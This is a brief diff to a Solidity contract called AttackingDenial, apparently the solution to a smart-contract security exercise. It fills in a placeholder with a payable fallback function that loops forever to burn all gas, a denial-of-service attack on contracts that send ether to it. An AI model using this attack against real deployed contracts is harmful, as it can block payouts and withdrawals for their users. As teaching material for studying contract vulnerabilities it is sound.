@@ -10,4 +10,8 @@ contract AttackingDenial {
     }
 
     //Code me!
+    fallback() external payable {
+        // consume all the gas
+      while(true) {}
+    }
 }
